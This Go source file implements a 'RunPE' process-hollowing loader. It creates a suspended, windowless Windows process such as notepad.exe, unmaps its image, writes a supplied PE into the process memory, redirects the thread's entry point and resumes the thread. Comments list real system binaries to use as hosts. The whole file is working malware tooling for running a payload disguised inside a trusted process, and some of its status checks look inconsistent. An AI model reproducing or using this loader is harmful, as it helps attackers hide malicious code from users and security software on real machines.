package main
	/*
		TODO:
			The source image must be rebased
	*/
import (
	"bytes"
	"unsafe"
	"syscall"
	"debug/pe"
	"encoding/binary"
)

const (
	MEM_RELEASE			= 0x00008000
	MEM_COMMIT			= 0x00001000
	MEM_RESERVE			= 0x00002000
	PAGE_EXECUTE			= 0x00000010
	PAGE_NOACCESS			= 0x00000001
	CONTEXT_INTEGER			= (0x000100000 | 0x000000002)
	CREATE_NO_WINDOW		= 0x08000000
	CREATE_SUSPENDED		= 0x00000004
	IMAGE_SCN_MEM_READ		= 0x40000000
	IMAGE_SCN_MEM_WRITE		= 0x80000000
	IMAGE_SCN_MEM_EXECUTE		= 0x20000000
	IMAGE_FILE_RELOCS_STRIPPED	= 0x0001
	IMAGE_SUBSYSTEM_WINDOWS_GUI	= 2
)

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7               uint32
	FloatSave         FLOATING_SAVE_AREA
	SegGs             uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}


var (
	ntdll = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	pNtResumeThread = ntdll.NewProc("NtResumeThread")
	pVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
	pNtGetContextThread = ntdll.NewProc("NtGetContextThread")
	pNtSetContextThread = ntdll.NewProc("NtSetContextThread")
	pNtReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
	pNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	pNtWriteVirtualMemory = ntdll.NewProc("NtWriteVirtualMemory")
	pNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
)

func RunPE(szHostExe string, lpPeContent []byte) (bool, *syscall.ProcessInformation) {
	szHostExe_UTF16, _ := syscall.UTF16PtrFromString(szHostExe)
	var si *syscall.StartupInfo = new(syscall.StartupInfo)
	var pi *syscall.ProcessInformation = new(syscall.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(&si))
	var pCreateProcessError error = syscall.CreateProcess(
		szHostExe_UTF16, nil, nil, nil, false, 
		uint32(CREATE_SUSPENDED | CREATE_NO_WINDOW), nil, nil, si, pi,
	)
	if(pCreateProcessError == nil) {
		defer syscall.CloseHandle(pi.Thread)
		defer syscall.CloseHandle(pi.Process)
		var hProcess uintptr = uintptr(pi.Process)
		var hThread uintptr = uintptr(pi.Thread)
		lpSectionHeader, lpSectionHeaderError  := pe.NewFile(
			bytes.NewReader(lpPeContent),
		)
		if(lpSectionHeaderError == nil) {
			var lpSectionHeaderArray []*pe.Section = lpSectionHeader.Sections
			var lpNtHeaderOptionalHeader = lpSectionHeader.OptionalHeader.(*pe.OptionalHeader32)
			var lpPreferableBase uint32 = uint32(lpNtHeaderOptionalHeader.ImageBase);
			var ThreadContext CONTEXT
			ThreadContext.ContextFlags = CONTEXT_INTEGER
			pNtGetContextThreadResult, _, _ := pNtGetContextThread.Call(
				hThread, uintptr(unsafe.Pointer(&ThreadContext)))
			if(pNtGetContextThreadResult == 0) {
				var lpPebImageBase uint32 = uint32(ThreadContext.Ebx + 8);
				var stReadBytes uint32
				var lpOriginalImageBase uint32
				var dwOriginalImageBase []byte = make([]byte, 4)
				pNtReadVirtualMemoryResult, _, _ := pNtReadVirtualMemory.Call(
					uintptr(hProcess), uintptr(lpPebImageBase),
					uintptr(unsafe.Pointer(&dwOriginalImageBase[0])), uintptr(uint32(4)), 
					uintptr(unsafe.Pointer(&stReadBytes)),
				)
				if(pNtReadVirtualMemoryResult == 0) {
					lpOriginalImageBase = binary.LittleEndian.Uint32(dwOriginalImageBase)
					if(lpOriginalImageBase == lpPreferableBase) {
						pNtUnmapViewOfSectionResult, _, _ := pNtUnmapViewOfSection.Call(
							hProcess, 
							uintptr(lpOriginalImageBase),
						)
						if(pNtUnmapViewOfSectionResult == 1) {
							return false, pi
						}
					}
					var lpAllocatedBase uintptr
					pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
						hProcess, uintptr(lpPreferableBase),
						uintptr(lpNtHeaderOptionalHeader.SizeOfImage), 
						uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE),
					)
					if(pVirtualAllocExResult == 0) {
						pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
							hProcess, uintptr(0),
							uintptr(lpNtHeaderOptionalHeader.SizeOfImage), 
							uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE))
						if(pVirtualAllocExResult == 0) {
							return false, pi
						}
						lpAllocatedBase = pVirtualAllocExResult 
					} else {
						lpAllocatedBase = pVirtualAllocExResult
					}
					var stWrittenBytes uintptr
					if(lpOriginalImageBase != uint32(lpAllocatedBase)) {
						pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
							hProcess, 
							uintptr(lpPebImageBase), 
							uintptr(unsafe.Pointer(&lpAllocatedBase)),
							uintptr(uint32(4)), 
							uintptr(unsafe.Pointer(&stWrittenBytes)),
						)
						if(pNtWriteVirtualMemoryResult == 1) {
							return false, pi
						}
					}
					lpNtHeaderOptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
					if (uint32(lpAllocatedBase) != lpPreferableBase) {
						if((lpSectionHeader.FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) > 0) {
							return false, pi
						} else {
							lpNtHeaderOptionalHeader.ImageBase = uint32(lpAllocatedBase)
						/*
							TODO:
								The source image must be rebased
						*/
						}
					}
					ThreadContext.Eax = uint32(lpAllocatedBase) + lpNtHeaderOptionalHeader.AddressOfEntryPoint;
					pNtSetContextThreadResult, _, _ := pNtSetContextThread.Call(hThread, uintptr(unsafe.Pointer(&ThreadContext)))
					if(pNtSetContextThreadResult == 0) {
						pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
							hProcess, 
							lpAllocatedBase, 
							uintptr(unsafe.Pointer(&lpPeContent[0])), 
							uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders),
							uintptr(unsafe.Pointer(&stWrittenBytes)),
						)
						if(pNtWriteVirtualMemoryResult == 0) {
							var dwOldProtect uintptr
							pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
								hProcess, 
								lpAllocatedBase, 
								uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders), 
								syscall.PAGE_READONLY, 
								uintptr(unsafe.Pointer(&dwOldProtect)),
							)
							if(pNtProtectVirtualMemoryResult != 0) {
								for i, Section := range lpSectionHeaderArray {
									SectionPointerToRawData, SectionPointerToRawDataError := Section.Data()
									if(SectionPointerToRawDataError == nil) {
										pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
											hProcess, 
											lpAllocatedBase + uintptr(Section.VirtualAddress), 
											uintptr(unsafe.Pointer(&SectionPointerToRawData[0])),
											uintptr(Section.Size), 
											uintptr(unsafe.Pointer(&stWrittenBytes)),
										)
										if(pNtWriteVirtualMemoryResult == 1) {
											return false, pi
										}
										var dwSectionMappedSize uint32 = 0
										if(i == int(lpSectionHeader.FileHeader.NumberOfSections) - 1) {
											dwSectionMappedSize = lpNtHeaderOptionalHeader.SizeOfImage - Section.VirtualAddress
										} else {
											dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress
										}
										var dwSectionProtection uint32 = 0
										if (((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0)) {
											dwSectionProtection = syscall.PAGE_EXECUTE_READWRITE
										} else if (((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0)) {
											dwSectionProtection = syscall.PAGE_EXECUTE_READ;
										} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0 ) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
											dwSectionProtection = syscall.PAGE_EXECUTE_WRITECOPY
										} else if (((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0)) {
											dwSectionProtection = syscall.PAGE_READWRITE
										} else if ((Section.Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) {
											dwSectionProtection = PAGE_EXECUTE
										} else if ((Section.Characteristics & IMAGE_SCN_MEM_READ) > 0) {
											dwSectionProtection = syscall.PAGE_READONLY
										} else if ((Section.Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
											dwSectionProtection = syscall.PAGE_WRITECOPY
										} else {
											dwSectionProtection = PAGE_NOACCESS
										}
										pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
											hProcess, 
											lpAllocatedBase + uintptr(Section.VirtualAddress), 
											uintptr(dwSectionMappedSize), 
											uintptr(dwSectionProtection), 
											uintptr(unsafe.Pointer(&dwOldProtect)),
										)
										if(pNtProtectVirtualMemoryResult == 0) {
											return false, pi
										}
									} else {
										return false, pi
									}
								}
								pNtResumeThreadResult, _, _ := pNtResumeThread.Call(uintptr(pi.Thread), uintptr(0))
								if(pNtResumeThreadResult == 0) {
									return true, pi
								} else {
									return false, pi
								}
							} else {
								return false, pi
							}
						}
					}
				}
			}
		}
	}
	return false, nil
}

func main() {
	/*
		How To Use:
			Example Of Paths In x64 Arch System: 
				//"C:\\Windows\\SysWOW64\\notepad.exe" // Native
				//"C:\\Windows\\SysWOW64\\bootcfg.exe" // Native
				//"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe" // For .NET PE 
			RunPE("C:\\Windows\\SysWOW64\\notepad.exe", Buffer)
	*/
}
